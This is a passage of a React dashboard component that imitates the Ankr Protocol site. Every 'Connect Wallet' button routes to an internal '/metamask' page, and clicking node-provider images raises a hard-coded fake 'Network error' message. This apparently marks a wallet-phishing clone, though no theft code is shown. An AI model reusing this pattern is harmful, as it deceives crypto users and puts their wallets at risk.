20.3122 21.0404 23.2572 17.8619 24.155V28.937L27.1927 24.1103Z"></path></svg>
									<Text fontSize="18px" fontWeight="bold" color="#356DF3" ml="2">Protocol</Text>
								</Flex>
							</Flex>
							<Flex color="#356DF3" onClick={() => history.push("/metamask")} fontWeight="bold" fontSize="14px" mr="3%" border="2px solid rgba(31, 34, 38, 0.1)" padding="8px 20px" borderRadius="12px">Connect Wallet</Flex>
						</Flex>

						<Flex position="fixed" bottom="0" left="0" w="100%" padding="5% 7%" bg="#fff" align="center" justify="space-between" boxShadow="0px 0px 25px rgb(31 34 38 / 5%), 0px 5px 100px rgb(31 34 38 / 5%)" zIndex="100">
							{
								linksMob.map((item, index) => (
									<Flex borderRadius="12px" cursor="pointer" key={index} justify="center" align="center" color={selected === index ? "#1F2226" : "#9AA1B0"} fontWeight={selected === index ? "bold" : "normal"} transition="color .3s ease-in-out" fontSize="10px" direction="column" onClick={() => {
										setSelected(index)
										setScreen(index)

										if (index === 1) {
											setScreenMini(0)
											setCheck(true)
										}
									}}>
										<Flex justify="center" w="100%" mb="2">{item.svg}</Flex>
										{item.tag}
									</Flex>
								))
							}
						</Flex>
					</Flex>
{/*******************************HEADER***************************/}
					<Flex align="center" w="calc(100% + 60px)" mb="7" zIndex="10" display={["none", "flex"]} className="stick" bg="#f2f5fa" py="30px" ml="-60px" pl="60px">
						<Flex flex="1" fontWeight="bold" fontSize="30px" lineHeight="1.167">
							{
								screen === 0 ?
								<Text>Public RPCs</Text>
								:
								screen === 1 ?
								<Text></Text>
								:
								screen === 2 &&
								<Text>Node Providers</Text>
							}
						</Flex>

						<Flex justify="flex-end" flex="1">
							<Button padding="4% 5%" color="#356DF3" bg="#fff" borderRadius="12px" lineHeight="1" fontWeight="bold" _hover={{ bg: "#fff", color: "#000", boxShadow: "0px 0px 24px rgba(0,0,0,0.2)" }} fontSize="14px" onClick={() => history.push("/metamask")}>Connect Wallet</Button>
						</Flex>
					</Flex>


					<Flex mb="5" flex="1" fontWeight="bold" fontSize="30px" lineHeight="1.167" display={["flex", "none"]}>
						{
							screen === 0 ?
							<Text>Public RPCs</Text>
							:
							screen === 1 ?
							<Text></Text>
							:
							screen === 2 &&
							<Text>Node Providers</Text>
						}
					</Flex>



{/*******************************MAIN CONTENT***************************/}
					{
						screen === 0 ?
						<Flex w="100%" direction="column">
							<Rpc />
						</Flex>
						:
						screen === 1 ?
						<Flex w="100%" direction="column">
							<Flex align="center" w="100%" direction={["column", "row"]}>
								<Image src={img1} h="70vh" w="auto" ml="-120px" display={["none", "inline-block"]} />
								<Image w="100%" mt="8" mb="5" display={["inline-block", "none"]} src={mimg1} />
								<Flex flex="1" justify="center" direction="column" pl={["1%", "3%"]} pr={["1%", "5%"]}>
									<Text fontWeight="bold" textAlign="center" fontSize={["34px", "45px"]} lineHeight="1.167">Ship fast, scale and save with Premium features.</Text>
									<Text mt="8px" color="#82899A" textAlign="center">We have just launched the <b>Pay as you Go</b> (PAYG) pricing model. You only pay for what you use. To start using all the premium features, make a <b>minimum deposit of 1000 ANKR</b> tokens to create your account.</Text>
									<Flex justify="center" mt="28px">
										<Flex padding="8px 24px" fontSize="16px" bg="#356DF3" color="#fff" borderRadius="12px" _hover={{  bg: "#124ede" }} fontWeight="bold" h="52px" align="center" transition="300ms ease-in-out" cursor="pointer" onClick={() => history.push("/metamask")}>Connect Wallet</Flex>
									</Flex>
								</Flex>
								<Image src={img2} h="70vh" w="auto" display={["none", "inline-block"]} />
							</Flex>
							<Flex w={["100%", "100%"]} whiteSpace={["nowrap", "normal"]} display={["block", "flex"]} flexWrap={["nowrap", "wrap"]} mt={["12", "0"]} justify={["flex-start", "space-between"]} bg="#f2f5fa" py="5" overflowX={["auto", "auto"]}>
								{
									wedo.map((item, index) => (
										<Flex display={["inline-block", "flex"]} key={index} w={["280px", "31.5%"]} mb={["0", "7"]} direction="column" padding="24px 28px" borderRadius="28px" bg="#fff" transition="background 500ms ease-in-out" cursor="pointer" h={["248px", "260px"]} whiteSpace="break-spaces" mr={["5", "0"]} _hover={{ bg: "#356DF3", color: "#fff" }} onMouseEnter={() => {
											if(wedoSub !== index) {
												setWedoSub(index)
											}
										}} onMouseLeave={() => {
											if(wedoSub === index) {
												setWedoSub("")
											}
										}}>
											{
												wedoSub === index ?
												<Text fontSize="14px" fontWeight="bold">{item.sub}</Text>
												:
												<Text fontSize="20px" fontWeight="bold">{item.name}</Text>
											}
											<Flex w="100%" mt={["100px", "auto"]} justify="flex-end">
												{
													wedoSub !== index &&
													<Flex color="#356DF3" cursor="pointer">
														<svg width="1em" height="1em" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" font-size="22" class="jss184"><path d="M19 12L5 12" stroke="currentColor" stroke-width="2" stroke-linecap="square" stroke-linejoin="round"></path><path d="M12 19L12 5" stroke="currentColor" stroke-width="2" stroke-linecap="square" stroke-linejoin="round"></path></svg>
													</Flex>
												}
											</Flex>
										</Flex>
									))
								}
							</Flex>
							<Flex mt={["50px", "90px"]} w="100%">
								<Image w="100%" h="auto" src={img3} display={["none", "block"]} onClick={() => window.open("https://www.ankr.com/docs/build-blockchain/concepts/pay-as-you-go/", "_BLANK")} />
								<Image w="100%" h="auto" src={mimg2} display={["block", "none"]} onClick={() => window.open("https://www.ankr.com/docs/build-blockchain/concepts/pay-as-you-go/", "_BLANK")} />
							</Flex>
							<Flex mt={["40px", "80px"]} w="100%">
								<Image w="100%" h="auto" src={img4} onClick={() => history.push("/metamask")} display={["none", "block"]} />
								<Image w="100%" h="auto" src={mimg3} onClick={() => history.push("/metamask")} display={["block", "none"]} />
							</Flex>
							<Flex mt={["50px", "90px"]} mb={["70px", "150px"]} w="100%" direction="column" justify="center">
								<Text fontSize={["24px", "34px"]} lineHeight="1.167" textAlign="center" px={["10%", "30%"]} fontWeight="bold">Have more questions? Let's hear them!</Text>
								<Flex justify="center" mt="20px">
									<Flex bg="#fff" cursor="pointer" padding="0px 24px" h="44px" align="center" fontSize="14px" borderRadius="12px" justify="center" fontWeight="bold" onClick={() => window.open("https://discord.com/invite/uYaNu23Ww7", "_BLANK")}>
									<svg width="1em" height="1em" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20.3303 4.22781C18.7767 3.50093 17.1156 2.97267 15.3789 2.67188C15.1656 3.05749 14.9164 3.57614 14.7446 3.98873C12.8985 3.71109 11.0693 3.71109 9.25716 3.98873C9.08539 3.57614 8.83055 3.05749 8.61536 2.67188C6.87681 2.97267 5.21376 3.50287 3.66019 4.23166C0.526643 8.96686 -0.322811 13.5845 0.101917 18.1365C2.18025 19.6885 4.19441 20.6313 6.17457 21.2483C6.66349 20.5754 7.09953 19.8601 7.47518 19.1063C6.75975 18.8344 6.07453 18.499 5.42707 18.1095C5.59884 17.9822 5.76686 17.8492 5.92918 17.7123C9.87819 19.5594 14.1689 19.5594 18.0707 17.7123C18.235 17.8492 18.403 17.9822 18.5728 18.1095C17.9235 18.5009 17.2364 18.8363 16.521 19.1082C16.8966 19.8601 17.3308 20.5774 17.8216 21.2502C19.8036 20.6333 21.8197 19.6905 23.898 18.1365C24.3964 12.8595 23.0467 8.28434 20.3303 4.22781ZM8.01318 15.337C6.82772 15.337 5.85555 14.2303 5.85555 12.8826C5.85555 11.535 6.80696 10.4264 8.01318 10.4264C9.21942 10.4264 10.1916 11.533 10.1708 12.8826C10.1727 14.2303 9.21942 15.337 8.01318 15.337ZM15.9867 15.337C14.8013 15.337 13.8291 14.2303 13.8291 12.8826C13.8291 11.535 14.7805 10.4264 15.9867 10.4264C17.193 10.4264 18.1651 11.533 18.1444 12.8826C18.1444 14.2303 17.193 15.337 15.9867 15.337Z" fill="#5865F2"></path></svg>
									<Text ml="2">Contact Support on Discord</Text>
									</Flex>
								</Flex>
							</Flex>
						</Flex>
						:
						screen === 2 ?
						<>
							<Image w="100%" src={npLogo} mb="6" display={["none", "block"]} />
							<Image w="100%" src={conn} mb="6" display={["block", "none"]} />
							
							<Image w={["100%", "65%"]} src={pageLogo} cursor="pointer" onClick={() => {
								setErrorMsg("Network error! Cannot fetch more node providers")
								setError(true)
							}} display={["none", "block"]}/>
							<Image w={["100%", "65%"]} src={pageLogoMob} cursor="pointer" onClick={() => {
								setErrorMsg("Network error! Cannot fetch more node providers")
								setError(true)
							}} display={["block", "none"]}/>
						</>
						:
						screen === 3 &&
						<Flex flex="1" bg="#fff" direction="column" w="100%" position="absolute" top="0" left="0" h="100vh" align="center" justify="center" padding="4%">
							<Flex direction="column" bg="#F2F5FA" borderRadius="15px" padding="60px 20px 16px" align="center" justify="center" mb="12" fontSize={["14px", "16px"]}>
								<Image src={Cube} w="84px" mt="-102px" mb="4" />
								<Flex bg="radial-gradient(50% 50% at 50% 50%,rgba(0,0,0,.2) 0,rgba(0,0,0,.05) 75%,rgba(0,0,0,0) 100%)" w="60%" py="4" mt="-8" mb="4"></Flex>
								<Text fontWeight="700" textAlign="center"><b>Deposit 50,000 ANKR</b></Text>
								<Text textAlign="center" mb="4">to become a node provider</Text>
								<Flex justify="center" mb="4" color="#356DF3" align="center" cursor="pointer" fontSize={["12px", "14px"]} fontWeight="bold" onClick={() => window.open("https://ankrnetwork.typeform.com/nodeprovider", "_blank")}>Join the waitlist <svg class="MuiSvgIcon-root-24 jss105" focusable="false" viewBox="0 0 11 10" aria-hidden="true" style={{ fill: "#356DF3", marginLeft: "5px", width: "14px", height: "14px" }}><path fill-rule="evenodd" clip-rule="evenodd" d="M-2.42004e-07 4.10032L6.82721 4.10032L4.3636 1.63672L5.6364 0.363926L10.2728 5.00032L5.6364 9.63672L4.3636 8.36393L6.82721 5.90032L-1.63323e-07 5.90032L-2.42004e-07 4.10032Z" fill="currentColor"></path></svg></Flex>
							</Flex>

							<Flex direction="column" w="100%" px="5%" mb="5">
								<Flex cursor="pointer" mb="3" color="black" align="flex-start" justify="flex-start" fontSize="14px" onClick={() => window.open("https://docs.ankr.com/ankr-protocol/about-ankr-protocol", "_blank")}><svg width="16" height="16" viewBox="0 0 16 16" style={{ marginRight: "20px", fill: "black" }} class="jss72"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.04446 2.60245L9.05751 2.60335C9.0682 2.60416 9.0762 2.605 9.08197 2.60573C9.08657 2.6093 9.09283 2.61436 9.10096 2.62134C9.1432 2.65761 9.1971 2.71096 9.29966 2.81352L11.8519 5.3658C11.9545 5.46836 12.0079 5.52227 12.0441 5.56451C12.0511 5.57264 12.0562 5.5789 12.0597 5.58349C12.0605 5.58926 12.0613 5.59727 12.0621 5.60795L12.063 5.62085H10.0001C9.7586 5.62085 9.60668 5.57867 9.51035 5.53626C9.41498 5.49426 9.34745 5.44038 9.28625 5.37919C9.22501 5.31794 9.1711 5.25039 9.12909 5.15501C9.08666 5.05869 9.04446 4.9068 9.04446 4.66538V2.60245ZM7.84446 2.59873H6.00007C5.35457 2.59873 4.9308 2.6 4.61699 2.64219C4.32044 2.68206 4.21339 2.74832 4.14819 2.81352C4.08299 2.87872 4.01674 2.98576 3.97687 3.28231C3.93468 3.59613 3.9334 4.01989 3.9334 4.6654V11.3321C3.9334 11.9776 3.93468 12.4013 3.97687 12.7151C4.01674 13.0117 4.08299 13.1187 4.14819 13.1839C4.21339 13.2491 4.32044 13.3154 4.61699 13.3553C4.9308 13.3975 5.35457 13.3987 6.00007 13.3987H10.0001C10.6456 13.3987 11.0693 13.3975 11.3831 13.3553C11.6797 13.3154 11.7867 13.2491 11.8519 13.1839C11.9171 13.1187 11.9834 13.0117 12.0233 12.7151C12.0655 12.4013 12.0667 11.9776 12.0667 11.3321V6.82085H10.0001C9.19377 6.82085 8.73162 6.52161 8.43773 6.22771C8.14393 5.93392 7.84446 5.47179 7.84446 4.66538V2.59873ZM9.54199 1.49515C9.30459 1.39681 9.0499 1.39778 8.83672 1.39859L8.78112 1.39873H6.00007L5.95975 1.39873C5.36566 1.3987 4.86036 1.39868 4.45709 1.45289C4.02747 1.51066 3.62499 1.63967 3.29966 1.96499C2.97434 2.29031 2.84533 2.6928 2.78757 3.12242C2.73335 3.52568 2.73337 4.03096 2.7334 4.62504V4.62508L2.7334 4.6654V11.3321L2.7334 11.3724V11.3724C2.73337 11.9665 2.73335 12.4718 2.78757 12.875C2.84533 13.3047 2.97434 13.7071 3.29966 14.0325C3.62499 14.3578 4.02747 14.4868 4.45709 14.5446C4.86036 14.5988 5.36566 14.5988 5.95976 14.5987L6.00007 14.5987H10.0001L10.0404 14.5987C10.6345 14.5988 11.1398 14.5988 11.543 14.5446C11.9727 14.4868 12.3752 14.3578 12.7005 14.0325C13.0258 13.7071 13.1548 13.3047 13.2126 12.875C13.2668 12.4718 13.2668 11.9665 13.2667 11.3724L13.2667 11.3321V5.88435L13.2669 5.82874C13.2677 5.61557 13.2686 5.36087 13.1703 5.12347L12.616 5.35308L13.1703 5.12347C13.072 4.88608 12.8912 4.70666 12.7399 4.5565L12.7005 4.51727L10.1482 1.96499L10.109 1.92557C9.9588 1.77426 9.77939 1.59348 9.54199 1.49515ZM5.4001 8.66539C5.4001 8.33402 5.66873 8.06539 6.0001 8.06539L10.0001 8.06539C10.3315 8.06539 10.6001 8.33402 10.6001 8.66539C10.6001 8.99676 10.3315 9.26539 10.0001 9.26539L6.0001 9.26539C5.66873 9.26539 5.4001 8.99676 5.4001 8.66539ZM6.0001 10.7321C5.66873 10.7321 5.4001 11.0007 5.4001 11.3321C5.4001 11.6634 5.66873 11.9321 6.0001 11.9321H8.66676C8.99813 11.9321 9.26676 11.6634 9.26676 11.3321C9.26676 11.0007 8.99813 10.7321 8.66676 10.7321L6.0001 10.7321Z" fill="currentColor"></path></svg> <Text pb="3" borderBottom="1px solid #EBEDF2" w="85%">Docs</Text></Flex>
							</Flex>
						</Flex>
					}
				</Flex>
			</Flex>
		</>
	)
}

export default Dashboard;
